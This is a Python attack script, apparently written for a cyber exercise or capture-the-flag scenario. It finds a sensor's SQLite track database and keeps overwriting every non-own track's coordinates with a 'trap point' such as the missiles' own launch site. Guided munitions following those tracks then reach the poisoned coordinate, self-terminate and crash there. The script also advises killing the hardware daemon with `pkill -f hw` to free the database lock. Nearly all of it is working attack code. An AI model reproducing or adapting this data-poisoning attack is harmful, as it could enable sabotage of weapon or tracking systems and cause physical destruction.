#!/usr/bin/env python3
"""self_destruct.py - trigger boomer 'Reached target' auto-exit.

Per Boomer.md line 356-361: if a boomer's haversine distance to its
assigned track is <= reach_distance_meters (default 50m), comms prints
`Reached target <trackID>` and calls os.Exit(0). The hw daemon continues
on its last GO_TO waypoint (the trap point) and impacts there.

Strategy: on a sensor, UPDATE every non-own track in gps_db_path to a
chosen trap point. Every boomer assigned to one of those tracks follows
the poisoned coord, reaches it, self-terminates, and crashes at the trap.

Default trap coord = Option A launch point (51.7479N / -55.9452W per
RRII ELCOA MANTIS). Missiles fly back to their launch platform.

Usage:
    python3 self_destruct.py                          # Option A launch
    python3 self_destruct.py --preset b               # Option B launch
    python3 self_destruct.py --preset c               # Option C launch
    python3 self_destruct.py --lat 45 --lon -40       # custom ocean dump
    python3 self_destruct.py --interval 1.5           # re-poison cadence

Operator note: this is a more aggressive variant of `mantis.py divert`.
  mantis.py divert -> 45N/-40W (unreachable, boomer runs out of fuel)
  self_destruct.py  -> reachable point that triggers the 50m threshold,
                       so comms exits immediately rather than burning fuel
"""
import argparse
import glob
import os
import re
import sqlite3
import sys
import time

# Trap presets per RRII ELCOA MANTIS (DTG 101200EDT APR 2026).
PRESETS = {
    "a":    (51.7479,  -55.9452),   # Option A launch point
    "b":    (46.1508,  -56.8084),   # Option B launch point
    "c":    (50.1402,  -55.1881),   # Option C launch point
    "box":  (49.25816, -61.89061),  # Option A kill box center
    "dump": (45.0,     -40.0),      # Mid-Atlantic ocean (matches mantis.py)
}
DEFAULT = "a"
DEFAULT_INTERVAL = 2.0

ENV_KEYS = ("SENSOR_CONFIG_PATH", "CONFIG_PATH")
DB_FALLBACKS = [
    "/var/lib/mantis/tracks.db",
    "/var/lib/sensor/tracks.db",
    "/var/lib/sensor/gps.db",
]


def _scalar(v):
    v = v.strip().strip('"').strip("'")
    if v.lower() == "true":  return True
    if v.lower() == "false": return False
    if re.fullmatch(r"-?\d+", v): return int(v)
    if re.fullmatch(r"-?\d*\.\d+", v): return float(v)
    return v


def _parse_yaml(text):
    out = {}
    for line in text.splitlines():
        s = line.strip()
        if not s or s.startswith("#") or s.startswith("- "):
            continue
        if ":" in s:
            k, _, v = s.partition(":")
            v = v.strip()
            if v:
                out[k.strip()] = _scalar(v)
    return out


def _load_cfg():
    for k in ENV_KEYS:
        p = os.environ.get(k)
        if p and os.path.exists(p):
            try:
                return _parse_yaml(open(p).read())
            except Exception:
                pass
    for p in ["/etc/sensor/config.yaml"] + glob.glob("/etc/*/config.yaml"):
        if not os.path.exists(p):
            continue
        try:
            cfg = _parse_yaml(open(p).read())
            if cfg.get("gps_db_path") or cfg.get("iff"):
                return cfg
        except Exception:
            continue
    return {}


def _resolve_db(cfg):
    for k in ("gps_db_path", "db_path", "track_db_path"):
        v = cfg.get(k)
        if v and os.path.exists(v):
            return v
    for p in DB_FALLBACKS:
        if os.path.exists(p):
            return p
    return None


def _poison(db_path, own_iff, lat, lon):
    """Returns (changed, total, err). Skips sensor's own track per
    Sensor.md line 219 (track_id == str(iff))."""
    try:
        conn = sqlite3.connect(db_path, timeout=2.0)
        total = conn.execute("SELECT COUNT(*) FROM tracks").fetchone()[0]
        if own_iff:
            cur = conn.execute(
                "UPDATE tracks SET latitude=?, longitude=? "
                "WHERE track_id <> ?", (lat, lon, own_iff))
        else:
            cur = conn.execute(
                "UPDATE tracks SET latitude=?, longitude=?", (lat, lon))
        changed = cur.rowcount
        conn.commit()
        conn.close()
        return changed, total, None
    except sqlite3.OperationalError as e:
        return 0, 0, f"locked/read-only: {e}"
    except Exception as e:
        return 0, 0, str(e)


def main():
    ap = argparse.ArgumentParser(add_help=True)
    ap.add_argument("--preset", choices=list(PRESETS.keys()), default=DEFAULT,
                    help=f"trap coord preset (default {DEFAULT})")
    ap.add_argument("--lat", type=float, help="override latitude")
    ap.add_argument("--lon", type=float, help="override longitude")
    ap.add_argument("--interval", type=float, default=DEFAULT_INTERVAL,
                    help=f"re-poison seconds (default {DEFAULT_INTERVAL})")
    ap.add_argument("--once", action="store_true",
                    help="pulse once and exit (default: loop)")
    args = ap.parse_args()

    lat, lon = PRESETS[args.preset]
    if args.lat is not None: lat = args.lat
    if args.lon is not None: lon = args.lon

    cfg = _load_cfg()
    db = _resolve_db(cfg)
    if not db:
        print("ERROR: no SQLite track DB found. Checked cfg.gps_db_path and",
              file=sys.stderr)
        for p in DB_FALLBACKS:
            print(f"  {p}", file=sys.stderr)
        sys.exit(2)
    if not os.access(db, os.W_OK):
        print(f"ERROR: {db} is not writable by this uid.", file=sys.stderr)
        sys.exit(2)

    own_iff = str(cfg.get("iff") or "")
    print(f"[+] DB:         {db}")
    print(f"[+] own IFF:    {own_iff or '(none; will poison every track)'}")
    print(f"[+] trap point: {lat},{lon}  (preset={args.preset})")
    if args.once:
        changed, total, err = _poison(db, own_iff, lat, lon)
        if err:
            print(f"[!] {err}", file=sys.stderr)
            sys.exit(1)
        print(f"[+] {changed}/{total} tracks poisoned")
        return

    print(f"[*] Loop every {args.interval}s. Ctrl-C to stop.")
    n = 0
    try:
        while True:
            n += 1
            changed, total, err = _poison(db, own_iff, lat, lon)
            tag = f"ERR {err}" if err else f"{changed}/{total} poisoned"
            print(f"  pulse {n}: {tag}")
            if n == 1 and err:
                print("[!] First pulse failed. If 'locked', the hw daemon",
                      file=sys.stderr)
                print("    holds the write lock. Try `pkill -f hw` first",
                      file=sys.stderr)
                print("    (this will stop new detections but unblock us).",
                      file=sys.stderr)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[+] Stopped.")


if __name__ == "__main__":
    main()
